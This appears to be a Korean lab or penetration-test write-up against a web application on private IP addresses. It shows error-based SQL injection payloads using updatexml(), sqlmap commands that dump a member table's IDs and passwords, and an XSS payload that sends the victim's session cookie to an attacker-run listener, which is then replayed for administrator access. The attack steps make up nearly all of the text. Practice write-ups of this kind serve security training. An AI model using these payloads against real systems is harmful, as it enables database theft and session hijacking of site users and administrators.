## 5. 데이터베이스 및 테이블 정보 수집

1️⃣ DB 이름 확인
```
' and updatexml(1,concat(0x3a,database()),1)--
```

→ updatexml() 로 fsk_m_db(DB 이름) 확인

2️⃣ 테이블 이름 확인 시도
```
' and updatexml(1,concat(0x3a,  
(select table_name from information_schema.tables   
where table_schema=database() limit 0,1)),1)--
```

→ `morning_badmin_table` 확인

3️⃣ 관리자 ID 추출 시도
```
' and updatexml(1,concat(0x3a,  
(select uid from morning_badmin_table limit 0,1)),1)--
```
→ ❌ 실패 (`:1` 에러)
→ 첫 번째 정보 추출 실패 그 다음엔 모든 테이블 목록 확인

4️⃣ sqlmap으로 전환 → 테이블 목록 확인
```
sqlmap -u "http://192.168.205.100/m_view.php?ps_db=notice&ps_boid=10&ps_page=1" \
--cookie="PHPSESSID=91b76e3588208ffbad094fa8ac4f1623" \
-D fsk_m_db --tables
```

→ 아이디 비번이 있을거 같은 table 선택
→ `morning_member_table` 발견

5️⃣ 회원 테이블 덤프
```
sqlmap -u "http://192.168.205.100/m_view.php?ps_db=notice&ps_boid=10&ps_page=1" \
--cookie="PHPSESSID=91b76e3588208ffbad094fa8ac4f1623" \
-D fsk_m_db -T morning_member_table --dump
```

→ 칼럼 수가 너무 많으니 추출

```
sqlmap -u "http://192.168.205.100/m_view.php?ps_db=notice&ps_boid=10&ps_page=1" \
--cookie="PHPSESSID=91b76e3588208ffbad094fa8ac4f1623" \
-D fsk_m_db -T morning_member_table \
-C member_id,member_pass --dump --batch
```

## 6. XSS 기반 세션 하이재킹

 🧨 실제 사용한 XSS 페이로드
```
<a href="javascript:void(new Image().src='http://192.168.205.128:9000/?c='+document['coo'+'kie'])">클릭</a>
```

1️⃣ 공격자 서버 실행

```
python3 -m http.server 9000
```

2️⃣ 위 페이로드 삽입
![](Pasted%20image%2020260420174123.png)

3️⃣ 관리자 클릭

4️⃣ Kali에서 세션 수신

/?c=PHPSESSID=...

5️⃣ 쿠키 값 복사 → 브라우저에 적용

	- 브라우저 개발자도구(F12) → Application → Cookies
	- `PHPSESSID` 값을 관리자 세션값으로 변경
	- 페이지 새로고침 → 로그인 없이 관리자 접근
